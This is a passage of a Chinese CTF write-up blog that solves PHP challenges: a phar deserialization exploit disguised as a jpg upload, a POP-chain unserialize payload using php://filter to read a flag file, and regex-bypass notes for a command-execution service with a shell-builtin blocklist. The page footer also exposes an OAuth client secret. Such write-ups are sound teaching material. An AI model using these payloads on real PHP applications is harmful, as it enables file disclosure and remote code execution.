class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>]=<span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">C1e4r</span>(<span class="keyword">new</span> <span class="title class_">Show</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;exp.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将生成的exp.phar重命名为exp.jpg，上传，然后计算md5</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;exp.jpg&quot;</span>.<span class="string">&quot;用户名处显示的你的IP&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>最后<code>/file.php?file=phar://upload/md5.jpg</code>getflag</p>
<p><img src="/images/image-20240110173409101.png" alt="image-20240110173409101"></p>
<h1 id="185-HNCTF-2022-WEEK4-pop子和pipi美"><a href="#185-HNCTF-2022-WEEK4-pop子和pipi美" class="headerlink" title="185.[HNCTF 2022 WEEK4]pop子和pipi美"></a>185.[HNCTF 2022 WEEK4]pop子和pipi美</h1><p>脑洞，<code>https://www.bilibili.com/bangumi/play/ep683045</code>的<code>ep683045</code>就是传入的参数</p>
<p>payload1:<code>?pop_EP=ep683045</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//flag is in f14g.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Popuko</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$No_893</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">POP_TEAM_EPIC</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$WEBSITE</span>  = <span class="string">&quot;MANGA LIFE WIN&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;No_893);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$anti_takeshobo</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$anti_takeshobo</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipimi</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pipi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PIPIPMI</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$h</span> = <span class="string">&quot;超喜欢POP子ww,你也一样对吧(举刀)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Pipi美永远不会生气ww&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pipi = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$corepop</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Goodsisters</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PopukoPipimi</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$is</span> = <span class="string">&quot;Good sisters&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiminonawa</span>,<span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;kiminonawa = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to HNCTF2022 ,&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;This is &#x27;</span>.<span class="variable language_">$this</span>-&gt;kiminonawa.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;kiminonawa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;kiminonawa)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;仲良ピース!&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;kiminonawa = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Goodsisters</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop_EP&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;pop_EP&#x27;</span>] == <span class="string">&quot;ep683045&quot;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;欸嘿,你也喜欢pop子~对吧ww&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>链子还是很简单的，提示性都特别明显，最终要<code>include()</code>，就要调用<code>append()</code>，就要调用<code>__invoke()</code>，在<code>Pipimi</code>的<code>__get()</code>里能触发<code>__invoke()</code>，在<code>Goodisisters</code>的<code>__toString()</code>里能触发<code>__get()</code>，在<code>__wakeup()</code>里能触发<code>__toStirng()</code>，<code>if(isset($_GET[&#39;pop&#39;])) @unserialize($_GET[&#39;pop&#39;]);  </code>能触发<code>__wakeup()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize()-&gt;Goodsisters::__wakeup()-&gt;Goodsisters::__toString()-&gt;Pipimi::__get()-&gt;Popuko::__invoke()-&gt;Popuko::append()-&gt;Popuko::include()</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag is in f14g.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Popuko</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$No_893</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">POP_TEAM_EPIC</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$WEBSITE</span>  = <span class="string">&quot;MANGA LIFE WIN&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;No_893);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$anti_takeshobo</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$anti_takeshobo</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipimi</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pipi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PIPIPMI</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$h</span> = <span class="string">&quot;超喜欢POP子ww,你也一样对吧(举刀)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Pipi美永远不会生气ww&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p=<span class="keyword">new</span> <span class="title class_">Popuko</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Goodsisters</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PopukoPipimi</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$is</span> = <span class="string">&quot;Good sisters&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiminonawa</span>,<span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;str=<span class="keyword">new</span> <span class="title class_">Pipimi</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;kiminonawa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;kiminonawa)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;仲良ピース!&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;kiminonawa = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Goodsisters</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kiminonawa = <span class="keyword">new</span> <span class="title class_">Goodsisters</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">#O%3A11%3A%22Goodsisters%22%3A2%3A%7Bs%3A10%3A%22kiminonawa%22%3BO%3A11%3A%22Goodsisters%22%3A2%3A%7Bs%3A10%3A%22kiminonawa%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A6%3A%22Pipimi%22%3A2%3A%7Bs%3A4%3A%22pipi%22%3BN%3Bs%3A1%3A%22p%22%3BO%3A6%3A%22Popuko%22%3A1%3A%7Bs%3A14%3A%22%00Popuko%00No_893%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Df14g.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BO%3A6%3A%22Pipimi%22%3A2%3A%7Bs%3A4%3A%22pipi%22%3BN%3Bs%3A1%3A%22p%22%3BO%3A6%3A%22Popuko%22%3A1%3A%7Bs%3A14%3A%22%00Popuko%00No_893%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Df14g.php%22%3B%7D%7D%7D</span></span><br></pre></td></tr></table></figure>

<p>payload2:</p>
<p><code>?pop=O%3A11%3A%22Goodsisters%22%3A2%3A%7Bs%3A10%3A%22kiminonawa%22%3BO%3A11%3A%22Goodsisters%22%3A2%3A%7Bs%3A10%3A%22kiminonawa%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A6%3A%22Pipimi%22%3A2%3A%7Bs%3A4%3A%22pipi%22%3BN%3Bs%3A1%3A%22p%22%3BO%3A6%3A%22Popuko%22%3A1%3A%7Bs%3A14%3A%22%00Popuko%00No_893%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Df14g.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BO%3A6%3A%22Pipimi%22%3A2%3A%7Bs%3A4%3A%22pipi%22%3BN%3Bs%3A1%3A%22p%22%3BO%3A6%3A%22Popuko%22%3A1%3A%7Bs%3A14%3A%22%00Popuko%00No_893%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Df14g.php%22%3B%7D%7D%7D</code></p>
<h1 id="186-FBCTF-2019-rceservice"><a href="#186-FBCTF-2019-rceservice" class="headerlink" title="186.[FBCTF 2019]rceservice"></a>186.[FBCTF 2019]rceservice</h1><p>附件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Web Adminstration Interface&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&#x27;PATH=/home/rceservice/jail&#x27;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">  $json = $_REQUEST[&#x27;cmd&#x27;];</span><br><span class="line"></span><br><span class="line">  if (!is_string($json)) &#123;</span><br><span class="line">    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br><span class="line">  &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;, $json)) &#123;</span><br><span class="line">    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;;</span><br><span class="line">    $cmd = json_decode($json, true)[&#x27;cmd&#x27;];</span><br><span class="line">    if ($cmd !== NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &#x27;Invalid input&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line">      Enter command as JSON:</span><br><span class="line">      &lt;input name=&quot;cmd&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>分析下正则</p>
<p><img src="/images/image-20240111150410575.png" alt="image-20240111150410575"></p>
<p>可以发现在头尾处匹配了<code>.</code>，而且没有用<code>s</code>来修饰，所以不包括换行符号<code>%0a</code>，有关修饰符的点可以自行查阅php手册，可以使用<code>%0a</code>绕过正则，也可以使用PCRE回溯次数绕过。</p>
<p>payload：&#96;?cmd&#x3D;</p>

        
    </section>
</article>



<div class="comments">
    <div id="comments"></div>
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
    new Gitalk({
        clientID: "8db4b4a89548994388e9",
        clientSecret: "83900737a29fd1d7795db259d911ae2deba58908",
        repo: "linyuqi9.github.io",
        owner: "linyuqi9",
        admin: ["linyuqi9"],
        id: "e7c267c34083576236c5ffdfeb3a49f2",
        distractionFreeMode: true,
        title: "NSS刷题记录1-200",
        body: "https://www.ayanagi.fun/2023/12/15/NSS%E5%8E%9F%E5%88%9B%E9%A2%98%E8%A7%A31-200/",
        labels: ["CTF"]
    }).render('comments');
    </script>
</div>



            </div>
        </div>

        
            
            <a id="pagenext" href="/2023/04/01/KrnWtdJ3y/" class="article-next" title="简单写个端口扫描器"><i class="icon-arrow-right"></i></a>
            
            
